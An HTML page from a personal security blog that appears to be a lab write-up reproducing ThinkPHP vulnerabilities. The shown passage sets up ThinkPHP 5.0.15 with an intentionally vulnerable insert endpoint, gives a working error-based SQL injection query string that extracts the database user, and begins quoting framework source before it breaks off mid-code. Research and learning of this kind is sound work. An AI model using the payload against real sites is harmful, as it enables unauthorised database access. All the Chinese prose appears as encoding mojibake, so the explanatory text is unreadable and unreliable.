<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="ThinkPHPÂéÜÂè≤ÊºèÊ¥ûÈÉ®ÂàÜÂ§çÁé∞">
<title>ThinkPHPÊºèÊ¥ûÂ§çÁé∞</title>

<link rel='canonical' href='https://fupanc-w1n.github.io/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/'>

<link rel="stylesheet" href="/scss/style.min.e1efb040517648e3208ef025cee1558f4e3e423656425dbd8e07546d18e42b3b.css"><meta property='og:title' content="ThinkPHPÊºèÊ¥ûÂ§çÁé∞">
<meta property='og:description' content="ThinkPHPÂéÜÂè≤ÊºèÊ¥ûÈÉ®ÂàÜÂ§çÁé∞">
<meta property='og:url' content='https://fupanc-w1n.github.io/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/'>
<meta property='og:site_name' content='fupanc'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-03-07T22:09:04&#43;08:00'/><meta property='article:modified_time' content='2025-03-07T22:09:04&#43;08:00'/>
<meta name="twitter:title" content="ThinkPHPÊºèÊ¥ûÂ§çÁé∞">
<meta name="twitter:description" content="ThinkPHPÂéÜÂè≤ÊºèÊ¥ûÈÉ®ÂàÜÂ§çÁé∞">
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="ÂàáÊç¢ËèúÂçï">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/123_hu4212831438090465177.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üîã</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">fupanc</a></h1>
            <h2 class="site-description">Èó≠ÂÖ≥‰øÆË°åÔºå‰∏çÈóÆÂΩíÊúü</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/fupanc-w1n'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>‰∏ªÈ°µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>ÂÖ≥‰∫é</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">
                    
                        <li id="i18n-switch">  
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 5h7" />
  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
  <path d="M12 20l4 -9l4 9" />
  <path d="M19.1 18h-6.2" />
</svg>



                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
                                
                                    <option value="https://fupanc-w1n.github.io/en/" >English</option>
                                
                                    <option value="https://fupanc-w1n.github.io/" selected>‰∏≠Êñá</option>
                                
                            </select>
                        </li>
                    
                

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>ÊöóËâ≤Ê®°Âºè</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ÁõÆÂΩï</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li>
      <ol>
        <li><a href="#thinkphp5-sqlÊ≥®ÂÖ•ÊºèÊ¥û">Thinkphp5 SQLÊ≥®ÂÖ•ÊºèÊ¥û</a>
          <ol>
            <li><a href="#ÁéØÂ¢ÉÊê≠Âª∫">ÁéØÂ¢ÉÊê≠Âª∫</a></li>
            <li><a href="#‰ª£Á†ÅÂÆ°ËÆ°">‰ª£Á†ÅÂÆ°ËÆ°</a></li>
            <li><a href="#‰øÆÂ§çÊñπÊ°à">‰øÆÂ§çÊñπÊ°à</a></li>
            <li><a href="#ÊÄªÁªì">ÊÄªÁªì</a></li>
          </ol>
        </li>
        <li><a href="#thinkphp-v6013ÂèçÂ∫èÂàóÂåñÊºèÊ¥û">Thinkphp v6.0.13ÂèçÂ∫èÂàóÂåñÊºèÊ¥û</a>
          <ol>
            <li><a href="#ÁéØÂ¢ÉÊê≠Âª∫-1">ÁéØÂ¢ÉÊê≠Âª∫</a></li>
            <li><a href="#‰ª£Á†ÅÂÆ°ËÆ°ÂàÜÊûê">‰ª£Á†ÅÂÆ°ËÆ°ÂàÜÊûê</a></li>
            <li><a href="#ÈóÆÈ¢òËß£ÂÜ≥">ÈóÆÈ¢òËß£ÂÜ≥</a></li>
            <li><a href="#ÊÄªÁªì-1">ÊÄªÁªì</a></li>
          </ol>
        </li>
        <li><a href="#thinkphpv800-ÂèçÂ∫èÂàóÂåñÊºèÊ¥û">Thinkphpv8.0.0 ÂèçÂ∫èÂàóÂåñÊºèÊ¥û</a>
          <ol>
            <li><a href="#ÁéØÂ¢ÉÊê≠Âª∫-2">ÁéØÂ¢ÉÊê≠Âª∫</a></li>
            <li><a href="#‰ª£Á†ÅÂÆ°ËÆ°-1">‰ª£Á†ÅÂÆ°ËÆ°</a></li>
          </ol>
        </li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/%E5%85%B6%E4%BB%96%E7%9F%A5%E8%AF%86%E7%82%B9/" style="background-color: #2a9d8f; color: #fff;">
                ÂÖ∂‰ªñÁü•ËØÜÁÇπ
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">ThinkPHPÊºèÊ¥ûÂ§çÁé∞</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            ThinkPHPÂéÜÂè≤ÊºèÊ¥ûÈÉ®ÂàÜÂ§çÁé∞
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Mar 07, 2025</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    ÈòÖËØªÊó∂Èïø: 14 ÂàÜÈíü
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="thinkphpÊºèÊ¥ûÂ§çÁé∞">ThinkPHPÊºèÊ¥ûÂ§çÁé∞
</h1><p>ThinkPHPÊòØ‰∏Ä‰∏™ÂÖçË¥πÂºÄÊ∫êÁöÑÔºåÂø´ÈÄü„ÄÅÁÆÄÂçïÁöÑÈù¢ÂêëÂØπË±°ÁöÑËΩªÈáèÁ∫ßPHPÂºÄÂèëÊ°ÜÊû∂„ÄÇ‰∏ãÈù¢Â∞±ÂØπÂá†‰∏™ÊºèÊ¥ûÁÇπËøõË°åÂ≠¶‰π†‰ª•ÂèäÂ§çÁé∞„ÄÇ</p>
<p>È¶ñÂÖàÈúÄË¶ÅÈÖçÁΩÆÂ•ΩxdebugÁéØÂ¢ÉÔºåËøôÈáåÂèØ‰ª•ÂèÇËÄÉÊàëÁöÑÂè¶‰∏ÄÁØáÊñáÁ´†Ôºö</p>
<p><a class="link" href="https://fupanc-w1n.github.io/p/phpstorm%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"  target="_blank" rel="noopener"
    >https://fupanc-w1n.github.io/p/phpstorm%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</a></p>
<h3 id="thinkphp5-sqlÊ≥®ÂÖ•ÊºèÊ¥û">Thinkphp5 SQLÊ≥®ÂÖ•ÊºèÊ¥û
</h3><p>ÊºèÊ¥ûÁâàÊú¨Ôºö5.0.13&lt;=ThinkPHP&lt;=5.0.15</p>
<p>‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî</p>
<h4 id="ÁéØÂ¢ÉÊê≠Âª∫">ÁéØÂ¢ÉÊê≠Âª∫
</h4><p>ËøôÈáåÂÜçÁÆÄÂçïËØ¥ËØ¥ÁéØÂ¢ÉÊê≠Âª∫ÔºåÂêéÈù¢ÂÖ∂ÂÆûÈÉΩÂ§ßÂ∑Æ‰∏çÂ∑ÆÁöÑ„ÄÇÂú®<a class="link" href="https://github.com/top-think/think/releases?page=6"  target="_blank" rel="noopener"
    >github</a>‰∏ä‰∏ãËΩΩv5.0.15ÁöÑÊ∫êÁ†ÅÔºåÁÑ∂ÂêéÂú®Â∞èÁöÆ‰∏≠Êê≠Âª∫‰∏Ä‰∏™ÁΩëÁ´ôÂç≥ÂèØÔºå‰ª•<code>composer.json</code>Êñá‰ª∂ÊâÄÂú®ÁõÆÂΩï‰∏∫Ê†πÁõÆÂΩïÔºåÁÑ∂ÂêéÈÖçÁΩÆmysqlÔºåÁõ¥Êé•‰ΩøÁî®phpstudy‰∏äÁöÑÂç≥ÂèØÔºå‰ΩÜÊòØÈúÄË¶ÅÂæÄÈáåÈù¢ÊèíÂÖ•Êï∞ÊçÆÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">create</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="n">tp_text</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="nf">users</span><span class="p">(</span><span class="n">username</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="nf">value</span><span class="w"> </span><span class="p">(</span><span class="s2">&#34;fupanc&#34;</span><span class="p">),(</span><span class="s2">&#34;test&#34;</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂Âêé‰øÆÊîπÈÉ®ÂàÜÊ∫êÁ†ÅÔºåÂú®composer.json‰∏≠ÊåáÂÆöÁâàÊú¨Ôºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503021626244.png"
	
	
	
	loading="lazy"
	
		alt="image-20250302162643214"
	
	
></p>
<p>ËøòÂèØ‰ª•ÁúãÂà∞ËøôÈáåÁöÑphpÁâàÊú¨Ë¶ÅÊ±ÇÔºå‰ΩÜÊòØÊàëËøôÈáåÂ∞±Áõ¥Êé•‰ΩøÁî®ÁöÑ7.3.4‰∫ÜÔºåÁÑ∂ÂêéÂú®Ëøô‰∏™ÁõÆÂΩï‰∏ã‰ΩøÁî®<code>composer install</code>Â∞±ÂàõÂª∫Â•Ω‰∫Ü„ÄÇ</p>
<p>ÁÑ∂ÂêéÂú®<code>application/index/controller/Index.php</code>‰∏≠Ê∑ªÂä†ÂÖ•Âè£ÁÇπÔºåÊ®°‰ªø‰∏Ä‰∏™Êï∞ÊçÆÊü•ËØ¢ÁöÑÈÉ®ÂàÜÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503021628573.png"
	
	
	
	loading="lazy"
	
		alt="image-20250302162858537"
	
	
></p>
<p>Âç≥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$username</span> <span class="o">=</span> <span class="nx">request</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;username/a&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">db</span><span class="p">(</span><span class="s1">&#39;users&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">insert</span><span class="p">([</span><span class="s1">&#39;username&#39;</span><span class="o">=&gt;</span><span class="nv">$username</span><span class="p">]);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂Âêé‰øÆÊîπÊï∞ÊçÆÂ∫ìÁöÑÈÖçÁΩÆÊñá‰ª∂Ôºå‰Ωç‰∫é<code>application/database.php</code>Ôºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503021630787.png"
	
	
	
	loading="lazy"
	
		alt="image-20250302163024755"
	
	
></p>
<p>ÂÜçÂú®<code>application/config.php</code>ÂºÄÂêØË∞ÉËØïÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="c1">// Â∫îÁî®Ë∞ÉËØïÊ®°Âºè
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;app_debug&#39;</span>              <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Â∫îÁî®Trace
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;app_trace&#39;</span>              <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>phpstormÁöÑÈÖçÁΩÆÂ∞±ÊòØÂâçÈù¢ÁªôÁöÑÊñáÁ´†ÔºåÂèÇËÄÉÈÇ£‰∏™Êù•ÈÖçÂç≥ÂèØÔºåÁÆÄÂçï‰øÆÊîπ‰∏Ä‰∏ãÂ¶Ç‰∫∫Âè£Ë∑ØÂæÑÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503021631510.png"
	
	
	
	loading="lazy"
	
		alt="image-20250302163159474"
	
	
></p>
<p>ÊúÄÂêéÊàêÂäüÊâì‰∏äÊñ≠ÁÇπÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503021632768.png"
	
	
	
	loading="lazy"
	
		alt="image-20250302163220728"
	
	
></p>
<p>‚Äî‚Äî‚Äî‚Äî</p>
<p>ËøôÈáåÂÖ∂ÂÆûÂ∞±ÊòØË¶Å‰º†ÂèÇusernameÔºåÂèØ‰ª•ÂÖàÁÆÄÂçïÂä†‰∏Ä‰∏™ÂèÇÊï∞Êù•Ë∞ÉËØï‰∏Ä‰∏ãËøáÁ®ãÔºåÁõ¥Êé•Â¶Ç‰∏ãÈÖçÁΩÆÂ∞±Ë°åÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503021943357.png"
	
	
	
	loading="lazy"
	
		alt="image-20250302194321268"
	
	
></p>
<h4 id="‰ª£Á†ÅÂÆ°ËÆ°">‰ª£Á†ÅÂÆ°ËÆ°
</h4><p>ÂºÄÂßãÂÆ°ËÆ°ÔºåÊâìÈÄöÁöÑPOCÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]=1
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøòÊòØÂÖà‰ªéÂéüÈÖçÁΩÆÁöÑ‰º†ÂèÇÊù•ÔºåÁÆÄÂçïËØ¥Êòé‰∏Ä‰∏ãËøôÈáåÁöÑÊ∑ªÂä†ÁöÑÂÖ•Âè£ÁöÑ‰ª£Á†ÅÈÄªËæëÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$username</span> <span class="o">=</span> <span class="nx">request</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;username/a&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">db</span><span class="p">(</span><span class="s1">&#39;users&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">insert</span><span class="p">([</span><span class="s1">&#39;username&#39;</span><span class="o">=&gt;</span><span class="nv">$username</span><span class="p">]);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂØπ‰∫éÁ¨¨‰∏ÄË°å‰ª£Á†ÅÔºåÂÖàÊòØÂàùÂßãÂåñ‰∫Ü‰∏Ä‰∏™requestÂØπË±°ÔºåÁÑ∂ÂêéË∞ÉÁî®‰∫Üget()ÂáΩÊï∞ÔºåË∑üËøõËøô‰∏™get()ÂáΩÊï∞Ôºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503021945969.png"
	
	
	
	loading="lazy"
	
		alt="image-20250302194544925"
	
	
></p>
<p>ËøôÈáåÁöÑgetÂú®Á±ª‰∏≠ÁöÑÊúÄÂàùÂÆö‰πâÊòØ‰∏Ä‰∏™Á©∫Êï∞ÁªÑÔºåÁÑ∂Âêé‰ºöÂ∞Ü<code>$_GET</code>Ôºà‰πüÂ∞±ÊòØget‰º†ÂèÇÁöÑÂÜÖÂÆπÔºâÁöÑÂÄºÂÖ®ÈÉ®ËµãÂÄºÁªôËøô‰∏™ÔºåÁÑ∂Âêé‰ºöË∞ÉÁî®input()ÊñπÊ≥ïÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">input</span><span class="p">(</span><span class="nv">$data</span> <span class="o">=</span> <span class="p">[],</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$default</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$filter</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">===</span> <span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// Ëé∑ÂèñÂéüÂßãÊï∞ÊçÆ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$name</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="s1">&#39;&#39;</span> <span class="o">!=</span> <span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// Ëß£Êûêname
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">list</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$type</span><span class="p">)</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$type</span> <span class="o">=</span> <span class="s1">&#39;s&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// Êåâ.ÊãÜÂàÜÊàêÂ§öÁª¥Êï∞ÁªÑËøõË°åÂà§Êñ≠
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">foreach</span> <span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="nv">$val</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="nv">$val</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="c1">// Êó†ËæìÂÖ•Êï∞ÊçÆÔºåËøîÂõûÈªòËÆ§ÂÄº
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="k">return</span> <span class="nv">$default</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">is_object</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
